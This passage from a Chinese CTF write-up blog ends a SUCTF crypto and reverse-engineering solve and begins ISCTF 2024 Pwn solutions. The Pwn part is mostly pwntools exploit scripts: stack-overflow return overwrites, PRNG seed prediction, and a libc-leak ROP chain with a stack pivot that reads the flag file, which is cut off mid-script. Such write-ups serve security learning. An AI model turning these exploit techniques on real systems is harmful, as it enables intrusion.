算法，然后去找脚本…就卡住了。实际上 password 是 23 位，但是只给出了 19 位，所以需要爆破4位密码（可以猜一个 F，然后变成爆破3位）。</p><p>借用一下 S1uM4i 战队的脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> Crypto.Cipher <span class="hljs-keyword">import</span> DES<br><span class="hljs-keyword">from</span> hashlib <span class="hljs-keyword">import</span> md5<br><span class="hljs-keyword">from</span> base64 <span class="hljs-keyword">import</span> b64decode<br><span class="hljs-keyword">from</span> tqdm <span class="hljs-keyword">import</span> tqdm<br><span class="hljs-keyword">from</span> itertools <span class="hljs-keyword">import</span> product<br>password = <span class="hljs-string">b&quot;SePassWordLen23SUCTF&quot;</span><br><br>OUTPUT = <span class="hljs-string">b&quot;ElV+bGCnJYHVR8m23GLhprTGY0gHi/tNXBkGBtQusB/zs0uIHHoXMJoYd6oSOoKuFWmAHYrxkbg=&quot;</span><br>alphabet = <span class="hljs-string">&quot;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/&#123;&#125;_-&quot;</span><br>enc = b64decode(OUTPUT)<br><br>salt = enc[:<span class="hljs-number">8</span>]<br>enc = enc[<span class="hljs-number">8</span>:]<br>s = product(alphabet, repeat=<span class="hljs-number">3</span>)<br><br><span class="hljs-keyword">for</span> a, b, c <span class="hljs-keyword">in</span> tqdm(s):<br>    key = password + (a+b+c).encode() + salt<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1000</span>):<br>        key = md5(key).digest()<br>    cipher = DES.new(key[:<span class="hljs-number">8</span>], DES.MODE_CBC, iv = key[<span class="hljs-number">8</span>:])<br>    dec = cipher.decrypt(enc)<br>    <span class="hljs-keyword">if</span> <span class="hljs-string">b&#x27;SUCTF&#123;&#x27;</span> <span class="hljs-keyword">in</span> dec <span class="hljs-keyword">or</span> <span class="hljs-string">b&#x27;suctf&#123;&#x27;</span> <span class="hljs-keyword">in</span> dec:<br>        <span class="hljs-built_in">print</span>(dec)<br>        <span class="hljs-built_in">print</span>(a+b+c)<br>        exit()<br></code></pre></td></tr></table></figure><img src="/post/23605/1736869382156-70907f03-3004-44ce-b4c8-f2998e754217.png" class="" title="img"><h2 id="Reverse"><a href="#Reverse" class="headerlink" title="Reverse"></a>Reverse</h2><h3 id="SU-BBRE"><a href="#SU-BBRE" class="headerlink" title="SU_BBRE"></a>SU_BBRE</h3><p>使用 ai 还原为 C语言代码（做的时候没想到还原 C，跑出来第一部分跟第三部分，没意识到缺了第二部分）</p><p>main 函数调用 function2 函数进行加密，实际上是进行 rc4 加密并且对比了 16 个字符；之后调用了 function0 函数，但是我们看到 function1 函数中也有对比的了逻辑，实际上是通过 strcpy 来溢出，从而进入了 function1 中，function1 函数进行一个简单的输入比对。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string.h&gt;</span></span><br><br><span class="hljs-comment">// Function declarations</span><br><span class="hljs-type">void</span> <span class="hljs-title function_">function0</span><span class="hljs-params">(<span class="hljs-type">char</span> *src)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">function1</span><span class="hljs-params">()</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">function2</span><span class="hljs-params">(<span class="hljs-type">char</span> *input)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">function3</span><span class="hljs-params">(<span class="hljs-type">char</span> *key, <span class="hljs-type">int</span> key_len, <span class="hljs-type">char</span> *s_box)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">function4</span><span class="hljs-params">(<span class="hljs-type">char</span> *s_box, <span class="hljs-type">char</span> *input, <span class="hljs-type">int</span> input_len)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">function5</span><span class="hljs-params">(<span class="hljs-type">char</span> *key, <span class="hljs-type">int</span> key_len, <span class="hljs-type">char</span> *input, <span class="hljs-type">int</span> input_len)</span>;<br><br><span class="hljs-comment">// Main function</span><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">char</span> **argv, <span class="hljs-type">char</span> **envp)</span> &#123;<br>    <span class="hljs-type">char</span> src[<span class="hljs-number">100</span>];<br><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;please input your flag:&quot;</span>);<br>    <span class="hljs-built_in">scanf</span>(<span class="hljs-string">&quot;%19s&quot;</span>, src);<br><br>    function2(src);<br>    function0(src);<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br><span class="hljs-comment">// Function0: Copies the input string to a destination buffer</span><br><span class="hljs-type">void</span> <span class="hljs-title function_">function0</span><span class="hljs-params">(<span class="hljs-type">char</span> *src)</span> &#123;<br>    <span class="hljs-type">char</span> dest[<span class="hljs-number">4</span>];<br>    <span class="hljs-built_in">strcpy</span>(dest, src);<br>&#125;<br><br><span class="hljs-comment">// Function1: Checks the input against a hardcoded string</span><br><span class="hljs-type">void</span> <span class="hljs-title function_">function1</span><span class="hljs-params">()</span> &#123;<br>    <span class="hljs-comment">// Hardcoded byte array for comparison</span><br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> expected_bytes[] = &#123;<br>        <span class="hljs-number">0x41</span>, <span class="hljs-number">0x6D</span>, <span class="hljs-number">0x62</span>, <span class="hljs-number">0x4D</span>,<br>        <span class="hljs-number">0x53</span>, <span class="hljs-number">0x49</span>, <span class="hljs-number">0x4E</span>, <span class="hljs-number">0x29</span>,<br>        <span class="hljs-number">0x28</span><br>    &#125;;<br><br>    <span class="hljs-comment">// Buffer to store user input</span><br>    <span class="hljs-type">char</span> user_input[<span class="hljs-number">9</span>]; <span class="hljs-comment">// 8 characters + 1 for null terminator</span><br><br>    <span class="hljs-comment">// Prompt the user for input</span><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;hhh,you find me:&quot;</span>);<br>    <span class="hljs-built_in">scanf</span>(<span class="hljs-string">&quot;%s&quot;</span>, user_input); <span class="hljs-comment">// Read up to 8 characters to avoid buffer overflow</span><br><br>    <span class="hljs-comment">// Check if the input matches the expected bytes</span><br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">9</span>; i++) &#123;<br>        <span class="hljs-keyword">if</span> ((user_input[i] - i) != expected_bytes[i]) &#123;<br>            <span class="hljs-comment">// If any byte doesn&#x27;t match, exit the program</span><br>            <span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-comment">// If all bytes match, print success message and exit</span><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;congratulate!!!&quot;</span>);<br>    <span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);<br>&#125;<br><br><span class="hljs-comment">// Function2: Checks the input against a hardcoded byte array</span><br><span class="hljs-type">void</span> <span class="hljs-title function_">function2</span><span class="hljs-params">(<span class="hljs-type">char</span> *input)</span> &#123;<br>    <span class="hljs-comment">// Hardcoded byte array for comparison</span><br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> expected_bytes[] = &#123;<br>        <span class="hljs-number">0x2F</span>, <span class="hljs-number">0x5A</span>, <span class="hljs-number">0x57</span>, <span class="hljs-number">0x65</span>,  <span class="hljs-comment">// &quot;/ZWe&quot;</span><br>        <span class="hljs-number">0x14</span>, <span class="hljs-number">0x8F</span>, <span class="hljs-number">0x69</span>, <span class="hljs-number">0xCD</span>,  <span class="hljs-comment">// Some bytes</span><br>        <span class="hljs-number">0x93</span>, <span class="hljs-number">0x29</span>, <span class="hljs-number">0x1A</span>, <span class="hljs-number">0x55</span>,  <span class="hljs-comment">// Some bytes</span><br>        <span class="hljs-number">0x18</span>, <span class="hljs-number">0x40</span>, <span class="hljs-number">0xE4</span>, <span class="hljs-number">0x5E</span>   <span class="hljs-comment">// Some bytes</span><br>    &#125;;<br><br>    <span class="hljs-comment">// Call function5 to process the input</span><br>    function5(<span class="hljs-string">&quot;suctf&quot;</span>, <span class="hljs-number">5</span>, input, <span class="hljs-number">16</span>);<br><br>    <span class="hljs-comment">// Compare the processed input with the expected bytes</span><br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">16</span>; i++) &#123;<br>        <span class="hljs-keyword">if</span> ((input[i]&amp;<span class="hljs-number">0xff</span>) != expected_bytes[i]) &#123;<br>            <span class="hljs-comment">// If any byte doesn&#x27;t match, exit the program</span><br>            <span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);<br>        &#125;<br>    &#125;<br>&#125;<br><br><span class="hljs-comment">// Function3: Initializes the S-box</span><br><span class="hljs-type">void</span> <span class="hljs-title function_">function3</span><span class="hljs-params">(<span class="hljs-type">char</span> *key, <span class="hljs-type">int</span> key_len, <span class="hljs-type">char</span> *s_box)</span> &#123;<br>    <span class="hljs-type">int</span> j = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt;= <span class="hljs-number">255</span>; i++) &#123;<br>        s_box[i] = i;<br>    &#125;<br><br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt;= <span class="hljs-number">255</span>; i++) &#123;<br>        j = (j + s_box[i] + key[i % key_len]) % <span class="hljs-number">256</span>;<br>        <span class="hljs-type">char</span> temp = s_box[i];<br>        s_box[i] = s_box[j];<br>        s_box[j] = temp;<br>    &#125;<br>&#125;<br><br><span class="hljs-comment">// Function4: Encrypts the input using the S-box</span><br><span class="hljs-type">void</span> <span class="hljs-title function_">function4</span><span class="hljs-params">(<span class="hljs-type">char</span> *s_box, <span class="hljs-type">char</span> *input, <span class="hljs-type">int</span> input_len)</span> &#123;<br>    <span class="hljs-type">int</span> i = <span class="hljs-number">0</span>, j = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> k = <span class="hljs-number">0</span>; k &lt; input_len; k++) &#123;<br>        i = (i + <span class="hljs-number">1</span>) % <span class="hljs-number">256</span>;<br>        j = (j + s_box[i]) % <span class="hljs-number">256</span>;<br>        <span class="hljs-type">char</span> temp = s_box[i];<br>        s_box[i] = s_box[j];<br>        s_box[j] = temp;<br>        input[k] ^= s_box[(s_box[i] + s_box[j]) % <span class="hljs-number">256</span>];<br>    &#125;<br>&#125;<br><br><span class="hljs-comment">// Function5: Combines function3 and function4</span><br><span class="hljs-type">void</span> <span class="hljs-title function_">function5</span><span class="hljs-params">(<span class="hljs-type">char</span> *key, <span class="hljs-type">int</span> key_len, <span class="hljs-type">char</span> *input, <span class="hljs-type">int</span> input_len)</span> &#123;<br>    <span class="hljs-type">char</span> s_box[<span class="hljs-number">256</span>];<br>    function3(key, key_len, s_box);<br>    function4(s_box, input, input_len);<br>&#125;<br></code></pre></td></tr></table></figure><p>rc4 可以直接解密，key 是 suctf</p><img src="/post/23605/1736845439618-039851d4-1075-4ba4-9907-441a09d14e6a.png" class="" title="img"><p>将 function1的地址40223D 按照小端序转成 ASCII 码的响应字符</p><img src="/post/23605/1736845738753-7d0a754a-1d49-43f3-9182-022971232d98.png" class="" title="img"><p>最后是 function1 函数把 flag 按下标加回来即可</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs python">var_1F = [<span class="hljs-number">0x41</span>, <span class="hljs-number">0x6d</span>, <span class="hljs-number">0x62</span>, <span class="hljs-number">0x4d</span>, <span class="hljs-number">0x53</span>, <span class="hljs-number">0x49</span>, <span class="hljs-number">0x4e</span>, <span class="hljs-number">0x29</span>, <span class="hljs-number">0x28</span>]<br><br>flag = <span class="hljs-string">&quot;&quot;</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(var_1F)):<br>    flag += <span class="hljs-built_in">chr</span>(var_1F[i] + i)<br><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;Part 3:&#x27;</span>, flag)<br><span class="hljs-comment">#Part 3: AndPWNT00</span><br></code></pre></td></tr></table></figure><p>suctf{We1com3ToReWorld&#x3D;”@AndPWNT00}</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>ISCTF 2024</title>
    <link href="/post/35326.html"/>
    <url>/post/35326.html</url>
    
    <content type="html"><![CDATA[<p>这是2024年11月份的一场新生赛，Pwn题的质量还不错，学到了一些东西。</p><h1 id="WriteUp"><a href="#WriteUp" class="headerlink" title="WriteUp"></a>WriteUp</h1><h2 id="Pwn"><a href="#Pwn" class="headerlink" title="Pwn"></a>Pwn</h2><h3 id="Netcat"><a href="#Netcat" class="headerlink" title="Netcat"></a>Netcat</h3><p>nc 签到</p><img src="/post/35326/1735357331995-8e7ede3e-7ad6-4ea2-801e-d259dcaecadb.png" class="" title="img"><h3 id="girlfriend"><a href="#girlfriend" class="headerlink" title="girlfriend"></a>girlfriend</h3><p>main 函数里有比对 admin，还发现 s1 在 buf 的范围内，可以在输入的时候控制 s1 为 admin。</p><img src="/post/35326/1735361420818-2decd7be-8486-4d94-9bfb-237a9c41543e.png" class="" title="img"><p>vuln 函数可以栈溢出，for 循环总共 8 次，在第八次输入时可以覆盖返回地址；0-5 是数组 v1，6 是 rbp，7 是返回地址；值得一提的是 i 是在 v1 的范围内，因此输入的值要合理。</p><img src="/post/35326/1735361439224-fb3c8c3b-b6a4-4b4d-8a55-18b769cff807.png" class="" title="img"><p>有后面函数</p><img src="/post/35326/1735386043390-81a0f68d-b2fa-4c6c-b313-5ef93350775e.png" class="" title="img"><p>exp</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context(os = <span class="hljs-string">&#x27;linux&#x27;</span>, arch = <span class="hljs-string">&#x27;amd64&#x27;</span>, log_level = <span class="hljs-string">&#x27;debug&#x27;</span>)<br><br>p = process(<span class="hljs-string">&#x27;./pwn&#x27;</span>)<br><span class="hljs-comment"># p = remote(&#x27;gz.imxbt.cn&#x27;, 20665)</span><br><span class="hljs-comment"># p = remote(&#x27;27.25.151.12&#x27;, 30728)</span><br><br>shell = <span class="hljs-number">0x40121B</span><span class="hljs-comment">#4198939</span><br><br>payload = <span class="hljs-string">b&#x27;a&#x27;</span>*(<span class="hljs-number">0x30</span>-<span class="hljs-number">0x8</span>) + <span class="hljs-string">b&#x27;admin&#x27;</span><br>p.recvuntil(<span class="hljs-string">&quot;first i need your team id&quot;</span>)<br>p.send(payload)<br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">7</span>):<br>payload = <span class="hljs-string">b&#x27;5&#x27;</span><br>p.recvuntil(<span class="hljs-string">&quot;birthday\n&quot;</span>)<br>p.sendline(payload)<br><br>p.recvuntil(<span class="hljs-string">&quot;birthday\n&quot;</span>)<br>p.sendline(<span class="hljs-string">b&#x27;4198939&#x27;</span>)<br><br>p.interactive()<br></code></pre></td></tr></table></figure><h3 id="ez-game"><a href="#ez-game" class="headerlink" title="ez_game"></a>ez_game</h3><p>这题是一个伪随机数，总共需要跑 20001 次，最开始的想法是栈溢出控制 seed 的值，但是在循环里面没处理好；后面的做法是先跑 20001 次随机数存到列表中，然后连上远程发送列表里的随机数。</p><img src="/post/35326/1735361023649-7b183176-7e0f-4922-8d54-fbb9d8dae671.png" class="" title="img"><p>这里我给出了两个 exp，第一个是先跑随机数，第二个是栈溢出控制随机数。</p><p>exp1</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> ctypes <span class="hljs-keyword">import</span> *<br>context(os = <span class="hljs-string">&#x27;linux&#x27;</span>, arch = <span class="hljs-string">&#x27;amd64&#x27;</span>, log_level = <span class="hljs-string">&#x27;debug&#x27;</span>)<br><br>libc = cdll.LoadLibrary(<span class="hljs-string">&#x27;./libc.so.6&#x27;</span>)<br><br>seed = <span class="hljs-number">1</span><br>libc.srand(seed)<br>random = []<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">20001</span>):<br>random.append(libc.rand() % <span class="hljs-number">7</span> + <span class="hljs-number">1</span>)<br><br><span class="hljs-comment"># p = process(&quot;./pwn&quot;)</span><br>p = remote(<span class="hljs-string">&#x27;27.25.151.12&#x27;</span>, <span class="hljs-number">31338</span>)<br><br>p.recvuntil(<span class="hljs-string">&quot;Enter your username: &quot;</span>)<br>p.sendline(<span class="hljs-string">b&#x27;1&#x27;</span>)<br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> random:<br>p.sendline(<span class="hljs-built_in">str</span>(i))<br><br>p.interactive()<br></code></pre></td></tr></table></figure><p>exp2</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> ctypes <span class="hljs-keyword">import</span> *<br>context(os = <span class="hljs-string">&#x27;linux&#x27;</span>, arch = <span class="hljs-string">&#x27;amd64&#x27;</span>, log_level = <span class="hljs-string">&#x27;debug&#x27;</span>)<br><br>libc = cdll.LoadLibrary(<span class="hljs-string">&#x27;./libc.so.6&#x27;</span>)<br><br>p = process(<span class="hljs-string">&quot;./pwn&quot;</span>)<br><span class="hljs-comment"># p = remote(&quot;gz.imxbt.cn&quot;, 20620)</span><br><br>p.recvuntil(<span class="hljs-string">&quot;Enter your username: &quot;</span>)<br>payload = <span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x190</span> + p64(<span class="hljs-number">0</span>)<br>p.sendline(payload)<br><br>libc.srand(<span class="hljs-number">0</span>)<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">20001</span>):<br>res = libc.rand() % <span class="hljs-number">7</span> + <span class="hljs-number">1</span><br>p.sendline(<span class="hljs-built_in">str</span>(res).encode())<br><br><br>p.interactive()<br></code></pre></td></tr></table></figure><h3 id="ret2orw"><a href="#ret2orw" class="headerlink" title="ret2orw"></a>ret2orw</h3><p>vuln 函数有栈溢出</p><img src="/post/35326/1731140627397-e6552388-7678-42ed-ac17-acb666d7d18e.png" class="" title="img"><p>开了沙箱禁用 execve，考虑使用 open、read 和 write 读取 flag。</p><img src="/post/35326/1731142376487-b5bcb9a6-1143-4f0d-8cc0-5b0eb55b3c77.png" class="" title="img"><p>我们在 vuln 泄露出 libc 之后返回到 main 函数，然后构造一个大的 read，并栈迁移到 bss 段，最后布置 orw 的 rop 链读取 flag，这里构造 read 是担心 0x100 字节不足以布置 orw 的 rop 链。</p><p>exp1</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context(os = <span class="hljs-string">&#x27;linux&#x27;</span>, arch = <span class="hljs-string">&#x27;amd64&#x27;</span>, log_level = <span class="hljs-string">&#x27;debug&#x27;</span>)<br><br><span class="hljs-comment"># p = process(&#x27;./pwn&#x27;)</span><br><span class="hljs-comment"># libc = ELF(&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;)</span><br>elf = ELF(<span class="hljs-string">&#x27;./pwn&#x27;</span>)<br>p = remote(<span class="hljs-string">&#x27;27.25.151.12&#x27;</span>, <span class="hljs-number">25636</span>)<br>libc = ELF(<span class="hljs-string">&#x27;./libc.so.6&#x27;</span>)<br><br>puts_plt = elf.plt[<span class="hljs-string">&#x27;puts&#x27;</span>]<br>puts_got = elf.got[<span class="hljs-string">&#x27;puts&#x27;</span>]<br>main = <span class="hljs-number">0x4012F2</span><br>bss = <span class="hljs-number">0x404060</span>+<span class="hljs-number">0x400</span><br>bss1 = <span class="hljs-number">0x404060</span>+<span class="hljs-number">0x700</span><br>pop_rdi = <span class="hljs-number">0x4012ce</span><br>pop_rbp = <span class="hljs-number">0x4011dd</span><br>leave_ret = <span class="hljs-number">0x40129f</span><br>ret = <span class="hljs-number">0x40101a</span><br><br>payload = <span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x20</span> + p64(<span class="hljs-number">0</span>)<br>payload += p64(pop_rdi) +p64(puts_got)<br>payload += p64(puts_plt) + p64(main)<br>p.recvuntil(<span class="hljs-string">&quot;oh,what&#x27;s this?\n&quot;</span>)<br>p.sendline(payload)<br>puts_addr = u64(p.recv(<span class="hljs-number">6</span>).ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>))<br>success(<span class="hljs-string">&#x27;puts_addr:&#123;&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(<span class="hljs-built_in">hex</span>(puts_addr)))<br><br>libc_base = puts_addr - libc.sym[<span class="hljs-string">&#x27;puts&#x27;</span>]<br>success(<span class="hljs-string">&#x27;libc_base:&#123;&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(<span class="hljs-built_in">hex</span>(libc_base)))<br>open_addr = libc_base + libc.sym[<span class="hljs-string">&#x27;open&#x27;</span>]<br>read_addr = libc_base + libc.sym[<span class="hljs-string">&#x27;read&#x27;</span>]<br>write = libc_base + libc.sym[<span class="hljs-string">&#x27;write&#x27;</span>]<br>pop_rsi = libc_base + <span class="hljs-number">0x16333a</span><br>pop_rdx = libc_base + <span class="hljs-number">0x904a9</span><span class="hljs-comment">#pop rdx; pop rbx; ret;</span><br><br><span class="hljs-comment">#read(0, bss, 0x500)</span><br>payload = <span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x28</span><br>payload += p64(pop_rdi)+ p64(<span class="hljs-number">0</span>)<br>payload += p64(pop_rsi) + p64(bss)<br>payload += p64(pop_rdx) + p64(<span class="hljs-number">0x500</span>) + p64(<span class="hljs-number">0</span>)<br>payload += p64(read_addr)<br>payload += p64(pop_rbp) + p64(bss) + p64(leave_ret)<br>p.recvuntil(<span class="hljs-string">&quot;oh,what&#x27;s this?\n&quot;</span>)<br>p.sendline(payload)<br><br><span class="hljs-comment">#open(bss, 0, 0)</span><br>payload = <span class="hljs-string">b&#x27;./flag\x00\x00&#x27;</span><br>payload += p64(pop_rdi) + p64(bss)<br>payload += p64(pop_rsi) + p64(<span class="hljs-number">0</span>)<br>payload += p64(pop_rdx) + p64(<span class="hljs-number">0</span>) + p64(<span class="hljs-number">0</span>)<br>payload += p64(open_addr)<br>payload += p64(ret)<br><span class="hljs-comment">#read(3, bss1, 0)</span><br>payload += p64(pop_rdi) + p64(<span class="hljs-number">3</span>)<br>payload += p64(pop_rsi) + p64(bss1)<br>payload += p64(pop_rdx) + p64(<span class="hljs-number">0x30</span>) + p64(<span class="hljs-number">0</span>)<br>payload += p64(read_addr)<br>payload += 